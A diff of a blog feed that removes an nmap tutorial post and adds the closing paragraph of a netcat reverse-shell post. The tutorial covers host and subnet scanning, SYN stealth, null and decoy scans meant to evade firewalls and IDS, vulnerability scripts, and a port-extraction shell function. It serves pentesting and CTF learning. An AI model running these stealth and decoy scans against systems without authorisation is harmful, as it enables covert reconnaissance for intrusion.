-&lt;p&gt;Use the command “nmap -help” to see the parameters and options offered by nmap, or you can use the command “man nmap” to see the full documentation.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-nmap/captura1.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;Using nmap commands:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ nmap [Scan Type(s)] [Options] {target specification}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;This is a basic scan to find all open ports and running services (this scan is not very good if we want to speed up the process and we will make a lot of noise on the network if we are attackers).&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-nmap/captura2.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;We can do the same scan with the domain name.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-nmap/captura3.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;If we want to report information about the machine in the scanning process we will use the parameter “-v” (from verbose). it is advisable to use this parameter to not wait for the scan to finish and meanwhile we can speed up the work.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-nmap/captura4.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;If we do a triple verbose we will get more information about the machine.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-nmap/captura5.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;We can scan several hots by puting the ip.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-nmap/captura6.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;We can perform the same scan of several hosts using the last octet of the ip address.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-nmap/captura7.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;Scanning a subnet, it reports the open ports on that subnet and the machines that are active on that subnet. (remember that if we do these types of scans we will make more noise on the network).&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-nmap/captura8.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;Scanning with a range of ip addresses.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-nmap/captura9.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;Scan the list of hosts that are in a file. In my case what i created a file and indicate the ip address, the localhost and the dns of htb.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-nmap/captura10.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;Now we will use the parameter “-iL (Input from hosts/network list)” and specify the file that we have created, to scan all IP addresses that we specify in the file.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-nmap/captura11.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;Scan the OS used by the target machine with the parameter “-O (os detection)”. First what it has done is to ping the host and then it has used the 3 wey handshake to discover the ports, and below we can see that it is a linux machine.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-nmap/captura12.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;With the “-A” parameter it shows more information about the machine’s OS. this parameter is interesting because it shows us the ssh-hostkey that is to authenticate to connect in the ssh protocol, in this case this key is public. and below we can see the traceroute that would be the intermediary nodes where they have passed the packets that we have sent.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-nmap/captura13.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;Scan a host to detect if the machine uses packet filters or firewall. In my case it is not filtered.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-nmap/captura14.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;To view all active hosts within the subnet, this command allows you to ping all hosts on the subnet.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-nmap/captura15.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;Print hotspot interfaces and routes to the terminal. You can find out the host interface and route information with nmap by using the “-iflist” option.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-nmap/captura16.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;With the “-F” parameter we indicate that we want a fast scan, but I don’t recommend to use this option as I will show better options for fast scanning below.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-nmap/captura26.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;Scan ports consecutively with the “-r (Scan ports consecutively, do not randomize)” parameter.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-nmap/captura27.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;Scan udp port&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-nmap/captura28.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;Scan and view the versions of different services running on each port.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-nmap/captura29.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;With the “-sN” parameter we do a null scan via tcp to fool the firewall. And it reports us by consala if the ports are filtered or not, by the firewall.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-nmap/captura32.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;We can specify if we want the scan to go faster by setting a timer templet “-T4”. The maximum is 5 but obviously if we want to go faster we will make more noise on the network.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-nmap/captura33.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;With the parameter “-n” we indicate that we do not want dns resolution, by default nmap applies the dns resolution and that is why we must specify it because there are times that the dns resolution takes more than 1 min and this makes the scan take longer.&lt;/p&gt;
-
-&lt;p&gt;With the parameter “-Pn (no ping)” we indicate that we do not want to discover hosts, in case we are only interested in the ports that are open, and this helps us to speed up the scanning process.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-nmap/captura35.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;With the “-sL (list scan)” parameter, simply list the targets to scan.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-nmap/captura36.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;Scan remote hosts using TCP ACK (TA) and TCP SYN (TS). These types of parameters are used when the firewall blocks standard ICMP ping requests, in which case you can use these two methods to scan remote hotspots.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-nmap/captura30.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;The same with the “-PA” paremeter of “ack” to port spool hosts by specifying the ports, but sending “ack” packet.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-nmap/captura31.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;Also nmap allows us to export the evidences in a file with certain parameters, depending on the parameter we use it has certain formats. We have to indicate these parameters after indicating the ip address and put the name of the file from where we want to export the evidences.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-nmap/captura41.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;As we have seen above we can specify the scan time. But we also have another option that can optimize the scanning process even more. For example the parameter “–min-rate” we can indicate how many packets we want to emit per second.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-nmap/captura42.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;There are several parameters that I have not mentioned but that can be useful in certain situations.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-nmap/captura37.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;h2 id=&quot;difference-between-tcp-connect-scan-and-syn-scan&quot;&gt;Difference between TCP connect scan and SYN scan&lt;/h2&gt;
-
-&lt;p&gt;Before using these types of scanning we must know how the TCP protocol works, the TCP protocol (Transmission Control Protocol) for example if we want to access a web site from our computer to the server where the web site is hosted, tcp allows how we must start the communication and how we can access that page. the rules that the tcp protocol uses to start a communication is with “3 wey handshake”. first the client sends a request called “syn”, the server resive the request and responds by sending the client a packet called “syn ack” and then the client sends another packet called “ack” so that the server receives the message that the client is successfully communicating with the server.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-nmap/tcp.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;Scan specific ports on the subnet to see if any hosts within the subnet have open ports 80 and 443 via tcp. With the “-sT” parameter we specify that we are going to use the full TCP connection (full open scan), and the magic of this is with the TCP protocol using the “3 way handshake”. using the 3 wey handshake nmap can find out if the ports are open or not.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-nmap/captura17.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;The problem with parameter types such as “-sT” is that we are indicating that we want to tcp the connection, and this can cause a lot of noise in the network and be detected by IDS.&lt;/p&gt;
-
-&lt;p&gt;To avoid this type of problems we are going to use the same command but with the parameter “-sS”, this parameter comes from “stealthy” this type of scanning is known as “syn scan” or “half-open scan”. with this parameter we indicate that we do not want the whole process of communication with tcp, as we have seen to communicate through tcp we have to complete the “3 way handshake” to establish the connection, if it does not complete these three processes there will be no connection. But still if the server has well configured firewall we can be detected, but with this parameter at least we avoid that problem a little.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-nmap/captura18.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;We are going to use these two commands again, but we are going to look at the traffic using wireshark.&lt;/p&gt;
-
-&lt;p&gt;Let’s use the “-sT” parameter to indicate all tcp scanning. If we do not specify the ports nothing happens, since by default if you do not specify it nmap scans the 1000 most common ports.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-nmap/captura19.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;Campturing the packages in wireshark:&lt;/p&gt;
-
-&lt;p&gt;First I send a “syn” packet, then the server sends me back a “syn ack” packet (to tell the client that it can communicate with port 443) and once the client receives it, it sends another “ack” packet (to tell the server that it can communicate perfectly). And the “rst, ack” means that this is the end of the communication. As we can see, the “3 wey handshake” has been successfully completed.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-nmap/captura20.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;Now let’s try with the parameter “-sS”.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-nmap/captura21.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;Campturing the packages in wireshark:&lt;/p&gt;
-
-&lt;p&gt;First the client sends a “syn” packet, the server replies with “syn. Ack” (telling the client that it can communicate in the port 443), and the communication is finished. In this case it does not comply with the “3 wey handshake” rule because the client does not send the “ack” packet to verify it. And with this we more or less avoid making a lot of noise on the network and being discovered by the firewall.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-nmap/captura22.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;we are going to use a parametor that is a bit similar “-sS”. With the parameter “-D (Cover up a scan with decoys)”, allows us to cover our traffic to not be discovered easily. As I said before if we are attackers and we are scanning a network and we are sending all that traffic we will make a lot of noise in the network, combining with the parameter “-sS”.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-nmap/decoy.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;What we have done with the previous command is to send a packet of “syn (-sS)”, but what we do is that there is another host that sends the same packet at the same time changing the ip which in this case is 10.10.16.8, and if someone is looking at the network traffic will see many hots sending that packet and will not know who is sending all those packets over the network, and this as an attacker helps us to cover up.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-nmap/captura23.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;In wireshark we can see that the packet has been sent at the same time with a duplicate, in my case I have added only one ip, but if we want we can specify ip ranges and more hosts would appear sending the same packet and it would be more difficult to find which computer is sending that traffic.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-nmap/captura25.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;h2 id=&quot;nmap-script&quot;&gt;Nmap script&lt;/h2&gt;
-
-&lt;p&gt;We can run custom scripts in nmap to find vulnerabilities in certain services. For example with the “-sC” parameter we can launch basic port scanning scripts, etc. If we go to the scripting section in the nmap documentation we can see the options we have.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-nmap/captura38.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;From the official nmap site there are many categories of scripting that can help us a lot when doing some kind of audit. For example in the “vuln (vulnerabilities)” section we can scan a host and see which ports are open or filtered and report us through the console if some of the ports that run certain services are vulnerable that we can exploit.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-nmap/captura39.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;With the parameter “-script” we are going to specify which script we are going to use, in my case I have put “vuln” with this I specify that it uses all the scripts of the vuln category, but with this it takes more time the scanning and it tends to make noise in the network. But we can specify script that you need and we will go even faster. As we can see it has reported me in the terminal the vulnerability that we can exploit in the ports that has been scanned.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-nmap/captura40.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;If we see that there is an open http port with nmap we can apply fuzzing along with an nmap dictionary of possible routes. There are several better tools for fuzzing, but nmap also has a built-in script for this task even if it is not very useful.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-nmap/http-enum.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;h2 id=&quot;useful-set-of-parameters&quot;&gt;Useful set of parameters&lt;/h2&gt;
-
-&lt;p&gt;First of all, I have used the parameter “-p-“ to scan all the existing port ranges, which are 65535 ports in total, with this parameter is a way to indicate it. We can use the other option of this parameter which is “-p1-65535”.&lt;/p&gt;
-
-&lt;p&gt;And the parameter “–open” is to indicate that we want to report in the terminal the ports that are in open status not filtered in the tcp protocol.&lt;/p&gt;
-
-&lt;p&gt;With the parameter “-T” is to control the timing and the performance of our scan, as I said before the faster we want our scan to go the more noise we are going to generate in the network.&lt;/p&gt;
-
-&lt;p&gt;And the “-v” parameter of verbose indicates that we want to report information during the scanning process.&lt;/p&gt;
-
-&lt;p&gt;And the parameter “-n” we specify that we don’t want dns resolution, if we don’t indicate it there are occasions that the dns resolution takes more than 1 min.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-nmap/captura43.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;If we want to go even faster and speed up the scanning process we can use the following parameters. With the “-sS” parameter we indicate a “tcp syn port scan” as I have already indicated what this parameter deos. And with the parameter “–min-rate [number of packets]” to indicate that I want to send packets no slower than 5000 packets per second, with this we get that our scan goes faster and with this combination we don’t need to use the parameter “-T”.&lt;/p&gt;
-
-&lt;p&gt;With the parameter “-vvv (verbose)” I am indicating that I want more information. And with the parameter “-Pn” we indicate that we don’t want host discovery through the arp address resolution protocol. And with the parameter “-oG” we indicate in which format we want to save the evidences and the file name.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-nmap/captura44.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;If we do a “cat” to the file we can see that the nmap capture is saved.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-nmap/captura45.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;In this case I used this format because I have a utility in the “~/.zshrc” file that shows me the available ports and ip in a more elegant way and copies the range of ports to the clipboard.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-nmap/captura46.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;To copy the function:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;extractPorts&lt;span class=&quot;o&quot;&gt;(){&lt;/span&gt;
-        &lt;span class=&quot;nv&quot;&gt;ports&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oP&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'\d{1,5}/open'&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'{print $1}'&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;FS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/'&lt;/span&gt; | xargs | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;' '&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;','&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
-        &lt;span class=&quot;nv&quot;&gt;ip_address&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oP&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;sort&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 1&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
-        &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[*] Extracting information...&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; extractPorts.tmp
-        &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[*] IP Address: &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ip_address&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; extractPorts.tmp
-        &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[*] Open ports: &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ports&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; extractPorts.tmp
-        &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$ports&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'\n'&lt;/span&gt; | xclip &lt;span class=&quot;nt&quot;&gt;-sel&lt;/span&gt; clip
-        &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;[*] Ports copied to clipboard&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; extractPorts.tmp
-        &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;extractPorts.tmp&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;rm &lt;/span&gt;extractPorts.tmp
-&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;With the “-sC” parameter we tell it to run some basic recon scripts. With the “-sV” parameter, we tell it to report the version of the services, this parameter can be used with the other “-sCV” to speed up the process even more. I indicate the ports that I have just discovered and I want to save the evidence with the nmap format “-oN” to the targeted file.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-nmap/captura47.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;And as we can see, the evidence has been saved correctly.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-nmap/captura48.png&quot; /&gt;
-&lt;/p&gt;</content><author><name>Nafsu Uddin</name></author><category term="Nmap" /><category term="Linux" /><category term="Hack the box" /><summary type="html">we are going to learn how to scan a network or a host using nmap, we are going to see some simple nmap commands and commands that help us to pentest.</summary></entry></feed>
+&lt;p&gt;In conclusion we have been able to learn how attackers can access our systems in an easier way. and it is also important to know how to use netcat if we are system administrators or are auditing a company and also these techniques are needed to know if we are doing ctf’s in hack the box, tryhackme.&lt;/p&gt;</content><author><name>Nafsu Uddin</name></author><category term="netcat" /><category term="Linux" /><category term="reverse shell" /><summary type="html">We are going to learn how we can reverse shell in every OS, and some netcat commands that can help us when we are pentesting or scanning our environment.</summary></entry></feed>
